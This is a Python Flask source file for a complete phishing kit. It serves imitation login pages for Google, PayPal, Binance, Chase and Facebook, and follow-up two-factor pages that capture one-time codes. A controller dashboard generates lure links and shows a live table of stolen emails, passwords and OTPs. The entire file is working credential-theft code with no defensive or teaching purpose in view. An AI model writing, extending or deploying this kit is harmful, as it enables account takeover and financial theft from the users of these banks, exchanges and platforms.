import secrets
import time
import uuid
from flask import Flask, request, jsonify

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

stolen_data = []

# ========== GOOGLE LOGIN PAGE ==========
GOOGLE_LOGIN = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Google Sign In</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:"Google Sans",Roboto,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:60px 28px}.logo{font-size:26px;margin-bottom:28px}h1{font-size:30px;margin-bottom:18px}.input-field{width:100%;max-width:380px;background:transparent;border:1.5px solid #5f6368;border-radius:4px;padding:16px;margin-bottom:16px;color:#fff}.btn-next{background:#7baaf7;color:#000;border:none;border-radius:6px;padding:14px 32px;cursor:pointer}</style>
</head>
<body><div class="logo">Google</div><h1>Sign in</h1><form id="loginForm"><input class="input-field" type="text" id="email" placeholder="Email or phone"><input class="input-field" type="password" id="password" placeholder="Password"><button type="submit" class="btn-next">Next</button></form>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('password').value,platform:'google',step:'login'})}).then(()=>{window.location.href='/otp/google';});});</script>
</body></html>
'''

# ========== PAYPAL LOGIN PAGE ==========
PAYPAL_LOGIN = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>PayPal Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f5f7fa;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}.card{background:#fff;border-radius:8px;padding:32px;width:90%;max-width:400px}.logo{font-size:32px;font-weight:bold;color:#003087;margin-bottom:24px}.input-field{width:100%;padding:14px;border:1px solid #ccc;border-radius:6px;margin-bottom:14px}.btn-next{width:100%;background:#0070ba;color:#fff;border:none;border-radius:28px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">PayPal</div><form id="loginForm"><input class="input-field" type="text" id="email" placeholder="Email"><input class="input-field" type="password" id="password" placeholder="Password"><button type="submit" class="btn-next">Log In</button></form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('password').value,platform:'paypal',step:'login'})}).then(()=>{window.location.href='/otp/paypal';});});</script>
</body></html>
'''

# ========== BINANCE LOGIN PAGE ==========
BINANCE_LOGIN = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Binance Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:16px;padding:32px;width:90%;max-width:400px;box-shadow:0 8px 20px rgba(0,0,0,0.1)}h2{color:#1e2026;margin-bottom:20px}.input-field{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;margin-bottom:16px}.btn-login{width:100%;background:#f0b90b;color:#1e2026;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><h2>Binance Log In</h2><form id="loginForm"><input class="input-field" type="email" id="email" placeholder="Email"><input class="input-field" type="password" id="password" placeholder="Password"><button type="submit" class="btn-login">Log In</button></form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('password').value,platform:'binance',step:'login'})}).then(()=>{window.location.href='/otp/binance';});});</script>
</body></html>
'''

# ========== CHASE LOGIN PAGE ==========
CHASE_LOGIN = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Chase Sign In</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#e8eaf0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:10px;padding:32px;width:90%;max-width:400px}.logo{font-size:28px;font-weight:bold;color:#1a56a0;margin-bottom:24px}.input-field{width:100%;padding:12px;border:none;border-bottom:2px solid #1a56a0;margin-bottom:20px}.btn-login{width:100%;background:#1a56a0;color:#fff;border:none;border-radius:5px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">CHASE</div><form id="loginForm"><input class="input-field" type="text" id="username" placeholder="Username"><input class="input-field" type="password" id="password" placeholder="Password"><button type="submit" class="btn-login">Sign In</button></form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('username').value,password:document.getElementById('password').value,platform:'chase',step:'login'})}).then(()=>{window.location.href='/otp/chase';});});</script>
</body></html>
'''

# ========== FACEBOOK LOGIN PAGE ==========
FACEBOOK_LOGIN = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Facebook Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#18191a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#242526;border-radius:12px;padding:28px;width:90%;max-width:400px;text-align:center}.fb-icon{width:48px;height:48px;background:#1877f2;border-radius:50%;margin:0 auto 20px}.input-field{width:100%;background:#3a3b3c;border:none;border-radius:8px;padding:14px;color:#fff;margin-bottom:12px}.btn-login{width:100%;background:#1877f2;color:#fff;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><div class="fb-icon"></div><form id="loginForm"><input class="input-field" type="text" id="email" placeholder="Email or phone"><input class="input-field" type="password" id="password" placeholder="Password"><button type="submit" class="btn-login">Log In</button></form></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.getElementById('email').value,password:document.getElementById('password').value,platform:'facebook',step:'login'})}).then(()=>{window.location.href='/otp/facebook';});});</script>
</body></html>
'''

# ========== OTP PAGES ==========
GOOGLE_OTP = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"><title>2-Step Verification</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#111;padding:32px;border-radius:16px;width:90%;max-width:350px}.otp-field{width:100%;padding:14px;background:#222;border:1px solid #333;border-radius:8px;color:#fff;text-align:center;font-size:24px}.btn-verify{width:100%;margin-top:20px;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;cursor:pointer}</style>
</head>
<body><div class="card"><h2>2-Step Verification</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="000000"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'google',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

PAYPAL_OTP = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"><title>Security Code</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f5f7fa;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:32px;width:90%;max-width:400px;text-align:center}.logo{font-size:32px;font-weight:bold;color:#003087}.otp-field{width:100%;padding:14px;border:1px solid #ccc;border-radius:6px;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#0070ba;color:#fff;border:none;border-radius:28px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">PayPal</div><h2>Security Code</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'paypal',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

BINANCE_OTP = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"><title>2FA Verification</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:16px;padding:32px;width:90%;max-width:400px;text-align:center}.otp-field{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#f0b90b;color:#1e2026;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><h2>Two-Factor Authentication</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter 6-digit code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'binance',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

CHASE_OTP = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"><title>Token Code</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#e8eaf0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:10px;padding:32px;width:90%;max-width:400px;text-align:center}.logo{font-size:28px;font-weight:bold;color:#1a56a0}.otp-field{width:100%;padding:14px;border:none;border-bottom:2px solid #1a56a0;margin:20px 0;text-align:center}.btn-verify{width:100%;background:#1a56a0;color:#fff;border:none;border-radius:5px;padding:14px;cursor:pointer}</style>
</head>
<body><div class="card"><div class="logo">CHASE</div><h2>Token Verification</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'chase',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

FACEBOOK_OTP = '''
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"><title>Two-Factor Authentication</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#18191a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#242526;border-radius:12px;padding:28px;width:90%;max-width:400px;text-align:center}.fb-icon{width:48px;height:48px;background:#1877f2;border-radius:50%;margin:0 auto 20px}.otp-field{width:100%;background:#3a3b3c;border:none;border-radius:8px;padding:14px;color:#fff;text-align:center;margin-bottom:20px}.btn-verify{width:100%;background:#1877f2;color:#fff;border:none;border-radius:8px;padding:14px;font-weight:bold;cursor:pointer}</style>
</head>
<body><div class="card"><div class="fb-icon"></div><h2>Two-Factor Authentication</h2><p>Enter code from authenticator app</p><form id="otpForm"><input class="otp-field" type="text" id="otp" placeholder="Enter code"><button type="submit" class="btn-verify">Verify</button></form></div>
<script>document.getElementById('otpForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:document.getElementById('otp').value,platform:'facebook',step:'otp'})}).then(()=>{document.body.innerHTML='<div style="text-align:center;padding:50px;"><h3>Verifying...</h3></div>';});});</script>
</body></html>
'''

# ========== DASHBOARD ==========
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"><title>Phishing Controller - Vercel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:monospace;color:#0f0;padding:20px}
.container{max-width:1200px;margin:auto}
h1{border-bottom:2px solid #0f0;padding-bottom:10px;margin-bottom:20px}
.card{background:#111827;border:1px solid #0f0;border-radius:16px;padding:20px;margin-bottom:20px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px;margin-bottom:20px}
.platform-btn{background:#1f2937;border:1px solid #0f0;border-radius:10px;padding:15px;text-align:center;color:#0f0;cursor:pointer}
.platform-btn:hover{background:#0f0;color:#000}
.link-box{background:#000;padding:15px;border-radius:10px;margin-top:15px}
.link-input{width:100%;padding:10px;background:#1a1a2e;color:#0f0;border:1px solid #0f0;border-radius:5px;margin:5px 0}
.copy-btn{background:#0f0;color:#000;border:none;padding:8px 16px;border-radius:5px;cursor:pointer}
table{width:100%;border-collapse:collapse}
th,td{border:1px solid #0f0;padding:10px;text-align:left}
th{background:#1f2937}
</style>
</head>
<body>
<div class="container">
<h1>💰 PHISHING CONTROLLER - VERCEL (Live on Cloud)</h1>
<div class="card"><span style="background:#0f0;color:#000;padding:5px 15px;border-radius:20px">🌍 ONLINE - Accessible from anywhere</span></div>
<div class="card">
<h3>🔗 Generate Phishing Links</h3>
<div class="platform-grid">
<div class="platform-btn" onclick="generateLink('google')">📧 Google</div>
<div class="platform-btn" onclick="generateLink('paypal')">🔵 PayPal</div>
<div class="platform-btn" onclick="generateLink('binance')">🟡 Binance</div>
<div class="platform-btn" onclick="generateLink('chase')">🏦 Chase</div>
<div class="platform-btn" onclick="generateLink('facebook')">📘 Facebook</div>
</div>
<div id="linkOutput"></div>
</div>
<div class="card">
<h3>📊 Stolen Credentials</h3>
<button onclick="fetchData()" style="background:#0f0;color:#000;border:none;padding:8px 16px;margin-bottom:15px;cursor:pointer">🔄 Refresh</button>
<div style="max-height:400px;overflow:auto"><table id="dataTable"><table><th>Time</th><th>Platform</th><th>Email</th><th>Password</th><th>OTP</th></tr></div>
</div>
</div>
<script>
let lastCount=0;
async function generateLink(p){
let r=await fetch(`/generate_link?platform=${p}`), d=await r.json();
let full=window.location.origin+d.link;
document.getElementById('linkOutput').innerHTML=`<div class="link-box"><strong>📤 Send this link:</strong><input class="link-input" type="text" value="${full}" id="linkInput" readonly><button class="copy-btn" onclick="copyLink()">📋 Copy</button></div>`;
}
function copyLink(){ let i=document.getElementById('linkInput'); i.select(); document.execCommand('copy'); alert('Copied!'); }
async function fetchData(){
let r=await fetch('/get_stolen'), d=await r.json();
let html='<tr><th>Time</th><th>Platform</th><th>Email</th><th>Password</th><th>OTP</th></tr>';
for(let i=d.length-1;i>=0;i--) html+=`<tr><td style="white-space:nowrap">${d[i].timestamp||''}</td><td>${d[i].platform||''}</td><td>${d[i].email||d[i].username||'-'}</td><td>${d[i].password||'-'}</td><td style="color:#ff4444">${d[i].otp||'-'}</td></tr>`;
document.getElementById('dataTable').innerHTML=html;
}
setInterval(fetchData,2000);fetchData();
</script>
</body></html>
'''

LOGIN_PAGES = {
    'google': GOOGLE_LOGIN,
    'paypal': PAYPAL_LOGIN,
    'binance': BINANCE_LOGIN,
    'chase': CHASE_LOGIN,
    'facebook': FACEBOOK_LOGIN
}

OTP_PAGES = {
    'google': GOOGLE_OTP,
    'paypal': PAYPAL_OTP,
    'binance': BINANCE_OTP,
    'chase': CHASE_OTP,
    'facebook': FACEBOOK_OTP
}

@app.route('/')
def index():
    return DASHBOARD

@app.route('/generate_link')
def generate_link():
    platform = request.args.get('platform', 'google')
    link_id = secrets.token_urlsafe(16)
    return jsonify({'link': f'/login/{platform}/{link_id}'})

@app.route('/login/<platform>/<link_id>')
def login_page(platform, link_id):
    return LOGIN_PAGES.get(platform, '<h1>Invalid</h1>')

@app.route('/otp/<platform>')
def otp_page(platform):
    return OTP_PAGES.get(platform, '<h1>Invalid</h1>')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    stolen_data.append({
        'platform': data.get('platform'),
        'step': data.get('step'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'email': data.get('email'),
        'username': data.get('username'),
        'password': data.get('password'),
        'otp': data.get('otp')
    })
    print(f"[+] {data.get('platform')} | {data.get('email', data.get('username', 'N/A'))}")
    return jsonify({'status': 'success'})

@app.route('/get_stolen')
def get_stolen():
    return jsonify(stolen_data[::-1])
